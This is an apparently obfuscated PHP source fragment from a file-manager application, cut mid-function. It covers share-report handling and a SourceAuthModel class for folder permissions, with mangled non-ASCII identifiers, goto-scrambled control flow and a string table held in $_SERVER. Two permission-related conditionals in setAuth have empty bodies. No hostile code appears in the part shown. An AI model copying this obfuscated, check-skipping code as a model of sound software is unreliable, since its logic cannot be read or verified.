!1; $a—ãë‹‚¹ = $EÇŸ½‹ÎÃ[$f¶Ï•ôˆ¸[373]]; $EÇŸ½‹ÎÃ[$f¶Ï•ôˆ¸[395]] = $C„¸ŠâÂ³ñ[$a—ãë‹‚¹] ? $C„¸ŠâÂ³ñ[$a—ãë‹‚¹] : !1; } goto CÂ‡‹Ç‘”ª; CÂ‡‹Ç‘”ª: unset($EÇŸ½‹ÎÃ); goto Dˆ»õš˜Ÿõ; f³É‡ğÅ: $f¶Ï•ôˆ¸ =& $_SERVER[…Ò×–]; $då”¨ˆôÚç = array_to_keyvalue($aÇ¦ê¾Úƒ, $f¶Ï•ôˆ¸[33], $f¶Ï•ôˆ¸[1450]); $D³áÄñÏëÆ = Model($f¶Ï•ôˆ¸[482])->userListInfo(array_unique($då”¨ˆôÚç)); goto A£Š¯è¤İ; Dˆ»õš˜Ÿõ: } private function _makeOrder($aîÚÒŒ´‡¢ = '') { goto E×¯‰˜ºÌë; A‚À‘¦Õ : $fØº“ØÍ”Ñ = Input::get($AóšŞ«Ş¼‹[411], $AóšŞ«Ş¼‹[7], $AóšŞ«Ş¼‹[393], $bâ•½‰ğÛƒ); $Aì‘²¬Î = Input::get($AóšŞ«Ş¼‹[412], $AóšŞ«Ş¼‹[7], $AóšŞ«Ş¼‹[2273], array($AóšŞ«Ş¼‹[2199], $AóšŞ«Ş¼‹[408])); $Aì‘²¬Î = $C÷œ¹“óÌ[$Aì‘²¬Î]; goto dƒíÑÍêìš; E×¯‰˜ºÌë: $AóšŞ«Ş¼‹ =& $_SERVER[…Ò×–]; $bâ•½‰ğÛƒ = array($AóšŞ«Ş¼‹[191], $AóšŞ«Ş¼‹[452], $AóšŞ«Ş¼‹[2259], $AóšŞ«Ş¼‹[2260]); $C÷œ¹“óÌ = array($AóšŞ«Ş¼‹[406] => $AóšŞ«Ş¼‹[407], $AóšŞ«Ş¼‹[408] => $AóšŞ«Ş¼‹[409]); goto A‚À‘¦Õ ; dƒíÑÍêìš: $aîÚÒŒ´‡¢ = $aîÚÒŒ´‡¢ . "{$fØº“ØÍ”Ñ}\40{$Aì‘²¬Î}"; return $this->order($aîÚÒŒ´‡¢); goto b„·Ü­ÇÃ¨; b„·Ü­ÇÃ¨: } public function reportAdd($Cß”ÔÄÙòë) { $c°£¸ÙÌéÃ =& $_SERVER[…Ò×–]; $F­Ÿ‹ø‡êÁ = array($c°£¸ÙÌéÃ[444] => $Cß”ÔÄÙòë[$c°£¸ÙÌéÃ[444]], $c°£¸ÙÌéÃ[1450] => USER_ID); if (Model($c°£¸ÙÌéÃ[2269])->where($F­Ÿ‹ø‡êÁ)->find()) { return !1; } $cš×¬îŠ = array($c°£¸ÙÌéÃ[444] => $Cß”ÔÄÙòë[$c°£¸ÙÌéÃ[444]], $c°£¸ÙÌéÃ[1354] => $Cß”ÔÄÙòë[$c°£¸ÙÌéÃ[1354]], $c°£¸ÙÌéÃ[373] => $Cß”ÔÄÙòë[$c°£¸ÙÌéÃ[373]], $c°£¸ÙÌéÃ[423] => $Cß”ÔÄÙòë[$c°£¸ÙÌéÃ[423]], $c°£¸ÙÌéÃ[1450] => USER_ID, $c°£¸ÙÌéÃ[29] => $Cß”ÔÄÙòë[$c°£¸ÙÌéÃ[29]], $c°£¸ÙÌéÃ[409] => $Cß”ÔÄÙòë[$c°£¸ÙÌéÃ[409]]); return Model($c°£¸ÙÌéÃ[2269])->add($cš×¬îŠ); } public function reportList($B×ÛëÍ¶â) { goto c—ÎÅÖÂÃİ; c—ÎÅÖÂÃİ: $BœÈÜİ«Ú™ =& $_SERVER[…Ò×–]; $d®ŒÏÇ®³ = array(); if ($B×ÛëÍ¶â[$BœÈÜİ«Ú™[707]]) { $fğ¹°Óæ‘ê = $B×ÛëÍ¶â[$BœÈÜİ«Ú™[452]] ? $B×ÛëÍ¶â[$BœÈÜİ«Ú™[452]] : strtotime(date($BœÈÜİ«Ú™[2271])); $d®ŒÏÇ®³[$BœÈÜİ«Ú™[191]] = array($BœÈÜİ«Ú™[325], array($B×ÛëÍ¶â[$BœÈÜİ«Ú™[707]], $fğ¹°Óæ‘ê)); } goto A·äà´Ìµ; Dâ“ùËò: $BƒÈ¯ß†ÍÇ = array($BœÈÜİ«Ú™[406] => $BœÈÜİ«Ú™[407], $BœÈÜİ«Ú™[408] => $BœÈÜİ«Ú™[409]); $c×µ•¬÷± = $BœÈÜİ«Ú™[2277] . $BƒÈ¯ß†ÍÇ[$B æ„ÌÜÅ]; $AÄÜ£ìô‡Ÿ = Model($BœÈÜİ«Ú™[2269])->where($d®ŒÏÇ®³)->order($c×µ•¬÷±)->selectPage(20); goto E·å»æø›õ; E·å»æø›õ: if (empty($AÄÜ£ìô‡Ÿ[$BœÈÜİ«Ú™[358]])) { return array(); } $this->_listDataApply($AÄÜ£ìô‡Ÿ[$BœÈÜİ«Ú™[358]]); return $AÄÜ£ìô‡Ÿ; goto b–«“ƒŠŠî; A·äà´Ìµ: if (isset($B×ÛëÍ¶â[$BœÈÜİ«Ú™[29]]) && in_array($B×ÛëÍ¶â[$BœÈÜİ«Ú™[29]], array($BœÈÜİ«Ú™[83], $BœÈÜİ«Ú™[2274], $BœÈÜİ«Ú™[2275], $BœÈÜİ«Ú™[2276], $BœÈÜİ«Ú™[1934]))) { $d®ŒÏÇ®³[$BœÈÜİ«Ú™[29]] = $B×ÛëÍ¶â[$BœÈÜİ«Ú™[29]]; } if (isset($B×ÛëÍ¶â[$BœÈÜİ«Ú™[694]]) && in_array($B×ÛëÍ¶â[$BœÈÜİ«Ú™[694]], array($BœÈÜİ«Ú™[473], $BœÈÜİ«Ú™[83], $BœÈÜİ«Ú™[2274], $BœÈÜİ«Ú™[2275]))) { $d®ŒÏÇ®³[$BœÈÜİ«Ú™[694]] = $B×ÛëÍ¶â[$BœÈÜİ«Ú™[694]]; } $B æ„ÌÜÅ = Input::get($BœÈÜİ«Ú™[412], $BœÈÜİ«Ú™[7], $BœÈÜİ«Ú™[2273], array($BœÈÜİ«Ú™[2199], $BœÈÜİ«Ú™[408])); goto Dâ“ùËò; b–«“ƒŠŠî: } public function reportStatus($BéïÔ£‹ï‡) { goto eŠ¸Á©£ß‘; eŠ¸Á©£ß‘: $DÓœñ˜‘İ× =& $_SERVER[…Ò×–]; $eÂ­“Àßï± = array($DÓœñ˜‘İ×[371] => $BéïÔ£‹ï‡[$DÓœñ˜‘İ×[371]]); $Céš‰ãÔĞ = Model($DÓœñ˜‘İ×[2269])->where($eÂ­“Àßï±)->field($DÓœñ˜‘İ×[2278])->find(); goto E®ù¦÷µ¿ß; E¥‹¨…¼Í: return $d‚ã§æõÏÌ; goto Aƒ¦—‰ì¾Í; A½å§£Ûæ: $d‚ã§æõÏÌ = Model($DÓœñ˜‘İ×[2269])->where($eÂ­“Àßï±)->save($eïëéàÏ°); if ($BéïÔ£‹ï‡[$DÓœñ˜‘İ×[694]] == $DÓœñ˜‘İ×[2274]) { if ($Céš‰ãÔĞ[$DÓœñ˜‘İ×[423]] != $DÓœñ˜‘İ×[473] && $this->shareFileMeta($Céš‰ãÔĞ[$DÓœñ˜‘İ×[423]])) { $this->shareFileMeta($Céš‰ãÔĞ[$DÓœñ˜‘İ×[423]], 0); } $this->remove($Céš‰ãÔĞ[$DÓœñ˜‘İ×[444]]); return !0; } if ($d‚ã§æõÏÌ && $BéïÔ£‹ï‡[$DÓœñ˜‘İ×[694]] == $DÓœñ˜‘İ×[2275]) { $DÃº×šÂå = $eïëéàÏ°[$DÓœñ˜‘İ×[694]] == $DÓœñ˜‘İ×[2275] ? 1 : 0; $this->shareFileMeta($Céš‰ãÔĞ[$DÓœñ˜‘İ×[423]], $DÃº×šÂå); $this->removeByFile($Céš‰ãÔĞ[$DÓœñ˜‘İ×[423]]); } goto E¥‹¨…¼Í; E®ù¦÷µ¿ß: if (!$Céš‰ãÔĞ) { return !1; } $eïëéàÏ° = array($DÓœñ˜‘İ×[694] => $BéïÔ£‹ï‡[$DÓœñ˜‘İ×[694]]); if ($BéïÔ£‹ï‡[$DÓœñ˜‘İ×[694]] == $DÓœñ˜‘İ×[2275] && $Céš‰ãÔĞ[$DÓœñ˜‘İ×[694]] == $DÓœñ˜‘İ×[2275]) { $eïëéàÏ°[$DÓœñ˜‘İ×[694]] = 0; } goto A½å§£Ûæ; Aƒ¦—‰ì¾Í: } private function removeByFile($A«°åëò«Õ) { goto C¾ÇˆÛ´Ğœ; C¾ÇˆÛ´Ğœ: $aí–ÌÇÎõ =& $_SERVER[…Ò×–]; $A´Ğ¥ĞÂ¢ = Model($aí–ÌÇÎõ[757])->where(array($aí–ÌÇÎõ[423] => $A«°åëò«Õ))->field($aí–ÌÇÎõ[373])->select(); $dÊÏ‚ø‚ = array_to_keyvalue($A´Ğ¥ĞÂ¢, $aí–ÌÇÎõ[33], $aí–ÌÇÎõ[373]); goto dÔŒÓª×‹×; dƒÊ¬•¯íĞ: $FÃ×º¯¦àæ = array_to_keyvalue($A´Ğ¥ĞÂ¢, $aí–ÌÇÎõ[33], $aí–ÌÇÎõ[444]); $this->remove($FÃ×º¯¦àæ); goto e™Ìè„›”à; dÔŒÓª×‹×: $c†Ãé´¬„± = array($aí–ÌÇÎõ[373] => array($aí–ÌÇÎõ[7], $dÊÏ‚ø‚), $aí–ÌÇÎõ[449] => 1); $A´Ğ¥ĞÂ¢ = Model($aí–ÌÇÎõ[2096])->where($c†Ãé´¬„±)->field($aí–ÌÇÎõ[444])->select(); if (empty($A´Ğ¥ĞÂ¢)) { return; } goto dƒÊ¬•¯íĞ; e™Ìè„›”à: } private function shareFileMeta($A¹¿å†¸±Ì, $bºÀ¥ÖÒÓŞ = null) { $dåóá¾ŠÓò =& $_SERVER[…Ò×–]; $cã¤ŒƒÊ¾œ = array($dåóá¾ŠÓò[423] => $A¹¿å†¸±Ì, $dåóá¾ŠÓò[89] => $dåóá¾ŠÓò[2279]); if (is_null($bºÀ¥ÖÒÓŞ)) { return Model($dåóá¾ŠÓò[2280])->where($cã¤ŒƒÊ¾œ)->find(); } $cã¤ŒƒÊ¾œ[$dåóá¾ŠÓò[363]] = $bºÀ¥ÖÒÓŞ; Model($dåóá¾ŠÓò[2280])->add($cã¤ŒƒÊ¾œ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\x72\143\145\x5f\x61\x75\x74\150"; public function getAuth($Bé¯Œ„ñ‰) { goto Dê¥é‚íš; bç² ‚…‹Ğ: $Eƒ§© °ƒ› = $this->field($B¡‚§Ó‡Š«)->order($fÀ®Œ¤ŞŸ[371])->where($FÛŞ²¬Êò)->select(); $fÃêáõ˜¶ = array(); $C‹×ÚïùêŠ = array(); goto A«ŠŞÅÅ…É; Dê¥é‚íš: $fÀ®Œ¤ŞŸ =& $_SERVER[…Ò×–]; $B¡‚§Ó‡Š« = $fÀ®Œ¤ŞŸ[2281]; $FÛŞ²¬Êò = array($fÀ®Œ¤ŞŸ[373] => $Bé¯Œ„ñ‰); goto bç² ‚…‹Ğ; a¬Á¶á˜ºá: return $fÃêáõ˜¶; goto dÒè’˜ª­—; A«ŠŞÅÅ…É: $d„¥Ô‡Üàî = 2 << 25; foreach ($Eƒ§© °ƒ› as $DñŸÃ²‚–¿) { goto B…ËÏÁãèœ; B…ËÏÁãèœ: $B¿—È¥›æÇ = Model($fÀ®Œ¤ŞŸ[2282])->listData($DñŸÃ²‚–¿[$fÀ®Œ¤ŞŸ[2263]]); if (!$B¿—È¥›æÇ) { continue; } $fÃêáõ˜¶[] = $DñŸÃ²‚–¿; goto aòœÚ¤»ö¤; aòœÚ¤»ö¤: $Cã‰É¹¹‚ö = 0; if ($DñŸÃ²‚–¿[$fÀ®Œ¤ŞŸ[375]] == SourceModel::TYPE_GROUP) { $Cã‰É¹¹‚ö = $d„¥Ô‡Üàî * 2; } if ($DñŸÃ²‚–¿[$fÀ®Œ¤ŞŸ[375]] == SourceModel::TYPE_USER) { $Cã‰É¹¹‚ö = $d„¥Ô‡Üàî; } goto döù‘ˆ›ñà; döù‘ˆ›ñà: if ($DñŸÃ²‚–¿[$fÀ®Œ¤ŞŸ[375]] == SourceModel::TYPE_USER && $DñŸÃ²‚–¿[$fÀ®Œ¤ŞŸ[461]] == $fÀ®Œ¤ŞŸ[473]) { $Cã‰É¹¹‚ö = 0; } $C‹×ÚïùêŠ[] = $B¿—È¥›æÇ[$fÀ®Œ¤ŞŸ[380]] + $Cã‰É¹¹‚ö; goto Eˆ£Ä¿‡–; Eˆ£Ä¿‡–: } array_multisort($C‹×ÚïùêŠ, SORT_DESC, $fÃêáõ˜¶); goto a¬Á¶á˜ºá; dÒè’˜ª­—: } public function setAuth($c’¢÷Å¶·¸, $BÆšô°‰Ì) { goto B‹ â¬â¤; e…ïõäæÑÑ: if ($BçÑÇ†× != $eÆƒîôÄ³Š) { $DÉ¡à²Š× = array($c÷Ê›ƒÛ‡™[2119] => $BçÑÇ†×); $A„Ä‹È³‡Û = Model($c÷Ê›ƒÛ‡™[2198])->field($c÷Ê›ƒÛ‡™[1450])->where($DÉ¡à²Š×)->select(); $A„Ä‹È³‡Û = array_to_keyvalue($A„Ä‹È³‡Û, $c÷Ê›ƒÛ‡™[33], $c÷Ê›ƒÛ‡™[1450]); } $Aš–¥‡–„ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $aöš¶ªä = array(); goto e£©óˆà‡†; B‹ â¬â¤: $c÷Ê›ƒÛ‡™ =& $_SERVER[…Ò×–]; $EƒŸ•àãê• = Model($c÷Ê›ƒÛ‡™[1127])->sourceInfo($c’¢÷Å¶·¸); if (!$EƒŸ•àãê•) { return !1; } goto d´µôÒµ‚; eÄ²±‘ƒà: return !0; goto b¾™¿‡ÔŠÊ; d´µôÒµ‚: if ($EƒŸ•àãê•[$c÷Ê›ƒÛ‡™[375]] != SourceModel::TYPE_GROUP) { return !1; } $eÆƒîôÄ³Š = 1; $BçÑÇ†× = $EƒŸ•àãê•[$c÷Ê›ƒÛ‡™[461]]; goto e…ïõäæÑÑ; e£©óˆà‡†: foreach ($BÆšô°‰Ì as $dƒ‡ëŒ) { if (!in_array($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[375]], $Aš–¥‡–„)) { show_json(LNG($c÷Ê›ƒÛ‡™[2283]), !1); } if ($BçÑÇ†× != $eÆƒîôÄ³Š) { if ($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[375]] == SourceModel::TYPE_GROUP) { } if ($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[461]] != 0 && !in_array($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[461]], $A„Ä‹È³‡Û)) { } } if ($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[461]] == 0) { $dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[375]] = SourceModel::TYPE_USER; } $aöš¶ªä[] = array($c÷Ê›ƒÛ‡™[373] => $c’¢÷Å¶·¸, $c÷Ê›ƒÛ‡™[375] => intval($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[375]]), $c÷Ê›ƒÛ‡™[461] => intval($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[461]]), $c÷Ê›ƒÛ‡™[2263] => intval($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[2263]]) ? intval($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[2263]]) : 0, $c÷Ê›ƒÛ‡™[2264] => intval($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[2264]]) ? intval($dƒ‡ëŒ[$c÷Ê›ƒÛ‡™[2264]]) : -1); } $this->where(array($c÷Ê›ƒÛ‡™[387] => $c’¢÷Å¶·¸))->delete(); $this->addAll($aöš¶ªä); goto eÄ²±‘ƒà; b¾™¿‡ÔŠÊ: } public function authClear($C¨·±ŞƒÔ) { $f£ëã¤Ò¦Ò =& $_SERVER[…Ò×–]; $F‚¡²à¨Ò• = Model($f£ëã¤Ò¦Ò[1127])->sourceInfo($C¨·±ŞƒÔ); $b¢·Ïˆô¼½ = array($C¨·±ŞƒÔ); if ($F‚¡²à¨Ò•[$f£ëã¤Ò¦Ò[374]] == $f£ëã¤Ò¦Ò[83]) { $açÃ³äà = array($f£ëã¤Ò¦Ò[530] => array($f£ëã¤Ò¦Ò[488], $F‚¡²à¨Ò•[$f£ëã¤Ò¦Ò[464]] . $C¨·±ŞƒÔ . $f£ëã¤Ò¦Ò[489])); $b¢·Ïˆô¼½ = Model($f£ëã¤Ò¦Ò[1127])->field($f£ëã¤Ò¦Ò[387])->where($açÃ³äà)->getField($f£ëã¤Ò¦Ò[373], !0); $b¢·Ïˆô¼½[] = $C¨·±ŞƒÔ; } $this->where(array($f£ëã¤Ò¦Ò[387] => array($f£ëã¤Ò¦Ò[388], $b¢·Ïˆô¼½)))->delete(); return !0; } public function getAllChildren($b¿¨£Á„¿) { goto B„Ğ¬Ê«¿; a­æÁÜòÅ: if ($eÄ—œ½’ƒÌ[$aé‹…ªÜæ¨[466]] == $aé‹…ªÜæ¨[473] && $eÄ—œ½’ƒÌ[$aé‹…ªÜæ¨[461]] != $BÑ¶¶Ú§¼ˆ) { $aÜÕÌï’ÎÊ = $this->groupChidldAllRootSource($eÄ—œ½’ƒÌ[$aé‹…ªÜæ¨[461]]); } $aßæ¼¤”ã = $this->field($aé‹…ªÜæ¨[373])->group($aé‹…ªÜæ¨[373])->select(); $aßæ¼¤”ã = array_to_keyvalue($aßæ¼¤”ã, $aé‹…ªÜæ¨[33], $aé‹…ªÜæ¨[373]); goto Bî†ôø½—; e ßåğ¥ò‚: $E§ö†§ãâ = Model($aé‹…ªÜæ¨[757])->field($f®¸ï…Ú•)->where($AöØ ­¼ïä)->select(); $C¯†—Ò“Š = array($b¿¨£Á„¿); foreach ($E§ö†§ãâ as $AÒÔºâÍíÎ) { foreach ($aÜÕÌï’ÎÊ as $EªÈİ”õ«Æ) { $eÔº¸¤é´Ş = $aé‹…ªÜæ¨[47] . $EªÈİ”õ«Æ . $aé‹…ªÜæ¨[47]; $FÈëé¯œ = $AÒÔºâÍíÎ[$aé‹…ªÜæ¨[464]] . $AÒÔºâÍíÎ[$aé‹…ªÜæ¨[373]] . $aé‹…ªÜæ¨[47]; if (strstr($FÈëé¯œ, $eÔº¸¤é´Ş)) { $C¯†—Ò“Š[] = $AÒÔºâÍíÎ[$aé‹…ªÜæ¨[373]]; break; } } } goto C“±çîÈ‹İ; B„Ğ¬Ê«¿: $aé‹…ªÜæ¨ =& $_SERVER[…Ò×–]; $eÄ—œ½’ƒÌ = Model($aé‹…ªÜæ¨[1127])->sourceInfo($b¿¨£Á„¿); if ($eÄ—œ½’ƒÌ[$aé‹…ªÜæ¨[374]] != $aé‹…ªÜæ¨[83]) { return $this->sourceListAuth(array($b¿¨£Á„¿)); } goto bÈ»µ‰ŠÃ; bÈ»µ‰ŠÃ: if ($eÄ—œ½’ƒÌ[$aé‹…ªÜæ¨[375]] != SourceModel::TYPE_GROUP) { return array(); } $BÑ¶¶Ú§¼ˆ = 1; $aÜÕÌï’ÎÊ = array($b¿¨£Á„¿); goto a­æÁÜòÅ; C“±çîÈ‹İ: return $this->sourceListAuth($C¯†—Ò“Š); goto eë›Œ®Õê; Bî†ôø½—: if (!$aßæ¼¤”ã) { return array(); } $f®¸ï…Ú• = $aé‹…ªÜæ¨[2284]; $AöØ ­¼ïä = array($aé‹…ªÜæ¨[373] => array($aé‹…ªÜæ¨[7], $aßæ¼¤”ã), $aé‹…ªÜæ¨[401] => $aé‹…ªÜæ¨[473]); goto e ßåğ¥ò‚; eë›Œ®Õê: } private function sourceListAuth($c•£Ë‰•Ïæ) { goto f¶ˆâ³…ù›; F†£ĞËÄ‚: return $DÖïšùÊ; goto fæŸä¾íÌ; f¶ˆâ³…ù›: $F†›ÜãİÆ =& $_SERVER[…Ò×–]; $Dãš˜„š×¢ = Model($F†›ÜãİÆ[1127])->sourceListInfo($c•£Ë‰•Ïæ, !0); $d†×Ö”óä = $F†›ÜãİÆ[2281]; goto D‘¯ä×ÉÆ©; Aİ‡îÅÚÀ: $B²Ôœã¯Ì = array(); foreach ($Dãš˜„š×¢ as $D’¬ÇŠ¤ï™) { goto fº»½áƒ; fº»½áƒ: unset($D’¬ÇŠ¤ï™[$F†›ÜãİÆ[383]]); unset($D’¬ÇŠ¤ï™[$F†›ÜãİÆ[382]]); unset($D’¬ÇŠ¤ï™[$F†›ÜãİÆ[380]]); goto b›‚„îŠßğ; f©’‚¬ÓÑİ: $D’¬ÇŠ¤ï™[$F†›ÜãİÆ[2285]] = $this->authTargetInfo($fÎ¾Ô¹˜Ó…); $D’¬ÇŠ¤ï™[$F†›ÜãİÆ[471]] = rtrim($D’¬ÇŠ¤ï™[$F†›ÜãİÆ[467]], $F†›ÜãİÆ[8]) . $F†›ÜãİÆ[8] . ltrim($D’¬ÇŠ¤ï™[$F†›ÜãİÆ[471]], $F†›ÜãİÆ[8]); $DÖïšùÊ[] = $D’¬ÇŠ¤ï™; goto c‰äÊää†; b›‚„îŠßğ: unset($D’¬ÇŠ¤ï™[$F†›ÜãİÆ[395]]); $fÎ¾Ô¹˜Ó… = $C–ĞÀšëÜÚ[$D’¬ÇŠ¤ï™[$F†›ÜãİÆ[373]]]; if (!$fÎ¾Ô¹˜Ó…) { continue; } goto f©’‚¬ÓÑİ; c‰äÊää†: $Eäù†·À³  = count(explode($F†›ÜãİÆ[8], trim($D’¬ÇŠ¤ï™[$F†›ÜãİÆ[471]], $F†›ÜãİÆ[8]))); $B²Ôœã¯Ì[] = $Eäù†·À³  + ($D’¬ÇŠ¤ï™[$F†›ÜãİÆ[29]] == $F†›ÜãİÆ[76] ? 0 : 1000); goto AÜ˜±›æ•; AÜ˜±›æ•: } array_multisort($B²Ôœã¯Ì, SORT_ASC, $DÖïšùÊ); goto F†£ĞËÄ‚; D‘¯ä×ÉÆ©: $FÆ‚Œ¹­‹£ = $this->field($d†×Ö”óä)->where(array($F†›ÜãİÆ[373] => array($F†›ÜãİÆ[7], $c•£Ë‰•Ïæ)))->select(); $C–ĞÀšëÜÚ = array_to_keyvalue_group($FÆ‚Œ¹­‹£, $F†›ÜãİÆ[373]); $DÖïšùÊ = array(); goto Aİ‡îÅÚÀ; fæŸä¾íÌ: } private function groupChidldAllRootSource($aÑšÅì¦‹´) { $f™êö·Š¥° =& $_SERVER[…Ò×–]; $a¬’£³ƒ«ó = Model($f™êö·Š¥°[2286])->groupChildrenAll($aÑšÅì¦‹´); $EÓÆÙ¹‡„ = array($f™êö·Š¥°[466] => 0, $f™êö·Š¥°[461] => array($f™êö·Š¥°[7], $a¬’£³ƒ«ó), $f™êö·Š¥°[375] => SourceModel::TYPE_GROUP); $c³Ûø§Ù’Ó = Model($f™êö·Š¥°[757])->field($f™êö·Š¥°[373])->where($EÓÆÙ¹‡„)->select(); $c³Ûø§Ù’Ó = array_to_keyvalue($c³Ûø§Ù’Ó, $f™êö·Š¥°[33], $f™êö·Š¥°[373]); return $c³Ûø§Ù’Ó; } private function authTargetInfo($c¿×ƒÛ‡¦²) { goto E±À¥¶­À—; eº‚Æ‡¶ğ: return $FÀÎ¿îîáº; goto b´ãŞö”ñÍ; EÏéáªí„ù: $EÎ¹Ú†‹Š« = 2 << 25; foreach ($c¿×ƒÛ‡¦² as $CáŒ“©éå“) { goto e‘„¡˜Š…; aƒãêö±·: if ($CáŒ“©éå“[$d¼ª…™£±ˆ[375]] == SourceModel::TYPE_USER && $CáŒ“©éå“[$d¼ª…™£±ˆ[461]] == $d¼ª…™£±ˆ[473]) { $CŒİ‰ÕÚîÖ = 0; } $b“ĞÈõ†ƒˆ[] = $bõÇáŠè‚õ[$d¼ª…™£±ˆ[380]] + $CŒİ‰ÕÚîÖ; goto b¸àİï—¤×; cˆ ØîƒŸ: if (!$cØ½œŸ–ª) { continue; } $cØ½œŸ–ª[$d¼ª…™£±ˆ[422]] = $bõÇáŠè‚õ; $FÀÎ¿îîáº[] = $cØ½œŸ–ª; goto DÅ¼ÔË´ÇŒ; DÅ¼ÔË´ÇŒ: $CŒİ‰ÕÚîÖ = 0; if ($CáŒ“©éå“[$d¼ª…™£±ˆ[375]] == SourceModel::TYPE_GROUP) { $CŒİ‰ÕÚîÖ = $EÎ¹Ú†‹Š« * 2; } if ($CáŒ“©éå“[$d¼ª…™£±ˆ[375]] == SourceModel::TYPE_USER) { $CŒİ‰ÕÚîÖ = $EÎ¹Ú†‹Š«; } goto aƒãêö±·; e‘„¡˜Š…: $bõÇáŠè‚õ = Model($d¼ª…™£±ˆ[2282])->listData($CáŒ“©éå“[$d¼ª…™£±ˆ[2263]]); if (!$bõÇáŠè‚õ) { continue; } if ($CáŒ“©éå“[$d¼ª…™£±ˆ[375]] == SourceModel::TYPE_USER) { $cØ½œŸ–ª = Model($d¼ª…™£±ˆ[479])->getInfoSimpleOuter($CáŒ“©éå“[$d¼ª…™£±ˆ[461]]); if ($cØ½œŸ–ª[$d¼ª…™£±ˆ[1450]] == $d¼ª…™£±ˆ[1042]) { continue; } if ($cØ½œŸ–ª[$d¼ª…™£±ˆ[1450]] == $d¼ª…™£±ˆ[473]) { $cØ½œŸ–ª[$d¼ª…™£±ˆ[28]] = LNG($d¼ª…™£±ˆ[2287]); } } else { $cØ½œŸ–ª = Model($d¼ª…™£±ˆ[463])->getInfoSimple($CáŒ“©éå“[$d¼ª…™£±ˆ[461]]); } goto cˆ ØîƒŸ; b¸àİï—¤×: } array_multisort($b“ĞÈõ†ƒˆ, SORT_DESC, $FÀÎ¿îîáº); goto eº‚Æ‡¶ğ; E±À¥¶­À—: $d¼ª…™£±ˆ =& $_SERVER[…Ò×–]; $FÀÎ¿îîáº = array(); $b“ĞÈõ†ƒˆ = array(); goto EÏéáªí„ù; b´ãŞö”ñÍ: } public function getAllChildrenByUser($BëÒÔŸº, $A”ùš¼À„½) { goto eÍµŒæö ¿; eÍµŒæö ¿: $D³ŸÀ´’ Œ =& $_SERVER[…Ò×–]; $aÍ²ÓÃÎ£’ = Model($D³ŸÀ´’ Œ[482])->getInfo($A”ùš¼À„½); if (!$A”ùš¼À„½ || !$BëÒÔŸº || !$aÍ²ÓÃÎ£’) { return array(); } goto eİ¯º¤Ü; eİ¯º¤Ü: $bõî†ëõ–ß = Model($D³ŸÀ´’ Œ[1127])->sourceInfo($BëÒÔŸº); $eà…äÈÚ¥ = array(); $e¥ç¾¶‡“Í = 1; goto bíÕÑ¤†š„; bíÕÑ¤†š„: if ($bõî†ëõ–ß[$D³ŸÀ´’ Œ[466]] == $D³ŸÀ´’ Œ[473] && $bõî†ëõ–ß[$D³ŸÀ´’ Œ[461]] != $e¥ç¾¶‡“Í && $this->groupContainUser($bõî†ëõ–ß[$D³ŸÀ´’ Œ[461]], $A”ùš¼À„½)) { foreach ($aÍ²ÓÃÎ£’[$D³ŸÀ´’ Œ[2288]] as $a–¦Ğ°ÏŒÈ) { $F‰à¶Í‹éÌ = Model($D³ŸÀ´’ Œ[463])->getInfo($a–¦Ğ°ÏŒÈ[$D³ŸÀ´’ Œ[2119]]); $ašÂÙŠä—Ò = Model($D³ŸÀ´’ Œ[482])->getInfoSimpleOuter($A”ùš¼À„½); $ašÂÙŠä—Ò[$D³ŸÀ´’ Œ[422]] = $a–¦Ğ°ÏŒÈ[$D³ŸÀ´’ Œ[380]]; if (Model($D³ŸÀ´’ Œ[2282])->authCheckAction($a–¦Ğ°ÏŒÈ[$D³ŸÀ´’ Œ[380]][$D³ŸÀ´’ Œ[380]], $D³ŸÀ´’ Œ[1574])) { continue; } $FÖİİâä”­ = array($D³ŸÀ´’ Œ[28] => $D³ŸÀ´’ Œ[1402] . $F‰à¶Í‹éÌ[$D³ŸÀ´’ Œ[28]], $D³ŸÀ´’ Œ[373] => $F‰à¶Í‹éÌ[$D³ŸÀ´’ Œ[395]][$D³ŸÀ´’ Œ[373]], $D³ŸÀ´’ Œ[75] => KodIO::make($F‰à¶Í‹éÌ[$D³ŸÀ´’ Œ[395]][$D³ŸÀ´’ Œ[373]]), $D³ŸÀ´’ Œ[466] => $D³ŸÀ´’ Œ[473], $D³ŸÀ´’ Œ[375] => $D³ŸÀ´’ Œ[977], $D³ŸÀ´’ Œ[29] => $D³ŸÀ´’ Œ[493], $D³ŸÀ´’ Œ[471] => $F‰à¶Í‹éÌ[$D³ŸÀ´’ Œ[468]], $D³ŸÀ´’ Œ[2119] => $F‰à¶Í‹éÌ[$D³ŸÀ´’ Œ[2119]], $D³ŸÀ´’ Œ[465] => $F‰à¶Í‹éÌ[$D³ŸÀ´’ Œ[466]], $D³ŸÀ´’ Œ[2285] => array($ašÂÙŠä—Ò)); $eà…äÈÚ¥[$FÖİİâä”­[$D³ŸÀ´’ Œ[373]]] = $FÖİİâä”­; } } $DøÂ–„ª¼ï = array(); $Fö·Ì¢ƒ… = $this->getAllChildren($BëÒÔŸº); goto BÕÃÁ Ú„‹; BÕÃÁ Ú„‹: foreach ($Fö·Ì¢ƒ… as $Bº÷”‡»ß¤) { $EÉ¯¹‰ÃŸğ = !1; foreach ($Bº÷”‡»ß¤[$D³ŸÀ´’ Œ[2285]] as $d‡³’æ¨Á) { if ($d‡³’æ¨Á[$D³ŸÀ´’ Œ[1450]]) { if ($d‡³’æ¨Á[$D³ŸÀ´’ Œ[1450]] == $A”ùš¼À„½) { $EÉ¯¹‰ÃŸğ = !0; break; } } if ($d‡³’æ¨Á[$D³ŸÀ´’ Œ[2119]]) { if ($this->groupContainUser($d‡³’æ¨Á[$D³ŸÀ´’ Œ[2119]], $A”ùš¼À„½)) { $EÉ¯¹‰ÃŸğ = !0; break; } } } if ($EÉ¯¹‰ÃŸğ) { $DøÂ–„ª¼ï[] = $Bº÷”‡»ß¤; } 